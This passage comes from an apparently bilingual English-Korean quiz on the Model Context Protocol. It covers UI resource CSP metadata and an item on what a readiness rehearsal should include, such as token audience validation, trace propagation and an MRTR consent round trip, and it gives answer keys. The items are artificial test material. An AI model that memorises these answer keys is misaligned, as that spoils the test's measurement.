C. permissions 메타데이터로 카메라나 마이크 접근을 요청하면 host 개입 없이 자동으로 부여된다\
D. UI resource의 csp 메타데이터는 허용 origin을 담은 평면 목록 하나가 아니라 connectDomains, frameDomains 같은 도메인 목록들로 된 객체다

<details><summary>정답</summary>

A, B, D. The csp metadata on the UI resource is structured as domain-list fields such as connectDomains, resourceDomains, frameDomains, and baseUriDomains rather than a flat origin list, an omitted csp forces a restrictive default that blocks outgoing connections, and the resource itself is retrieved with a normal resources/read call carrying the mcp-app HTML profile. Permissions such as camera and microphone are never granted automatically just because an app asks for them.

A, B, D. UI resource의 csp 메타데이터는 평면 origin 목록이 아니라 connectDomains, resourceDomains, frameDomains, baseUriDomains 같은 도메인 목록 필드로 구성된다. csp가 없으면 외부로 나가는 연결을 막는 제한적 기본값이 강제되고 resource 자체는 mcp-app HTML 프로필을 가진 일반 resources/read 호출로 가져온다. 카메라나 마이크 같은 권한은 앱이 요청했다는 이유만으로 자동 부여되는 일이 절대 없다.

</details>

## 60. [use-cases-and-ecosystem] (복수 정답)

A capstone readiness review is checking whether a team's end-to-end rehearsal actually covers the full 2026-07-28 surface before certification. Which three elements should the rehearsal include? Select three.

A. Audience validation of the token presented for the server, rejecting one issued for another resource\
B. A legacy initialize handshake, kept in the main request path so both eras share one code path\
C. Trace context propagated end to end so the exchange can be attributed and reviewed afterward\
D. An MRTR consent round trip using a new request id and an integrity-protected requestState

**한국어**

캡스톤 준비 검토에서 한 팀의 종단 간 리허설이 인증 전에 2026-07-28의 전체 범위를 실제로 다루는지 확인하고 있다. 리허설에 포함해야 할 요소 세 개는 무엇인가? 세 개 고르시오.

A. server에 제시된 토큰의 audience 검증. 다른 resource용으로 발급된 토큰은 거부한다\
B. 두 시대가 한 코드 경로를 공유하도록 주 요청 경로에 남겨 둔 레거시 initialize 핸드셰이크\
C. 교환을 나중에 귀속하고 검토할 수 있도록 종단 간 전파되는 trace context\
D. 새 요청 id와 무결성이 보호된 requestState를 쓰는 MRTR 동의 왕복

<details><summary>정답</summary>

A, C, D. A thorough readiness rehearsal exercises a proper MRTR consent round trip, strict audience validation against token misuse, and end-to-end trace propagation for auditability. A legacy initialize handshake does not belong in the 2026-07-28 main path, since that request was removed rather than kept as a shared code path.

A, C, D. 철저한 준비 리허설은 올바른 MRTR 동의 왕복, 토큰 오용을 막는 엄격한 audience 검증, 감사 가능성을 위한 종단 간 trace 전파를 실행해 본다. 레거시 initialize 핸드셰이크는 2026-07-28 주 경로에 속하지 않는다. 그 요청은 공유 코드 경로로 남겨진 것이 아니라 제거됐기 때문이다.

</details>
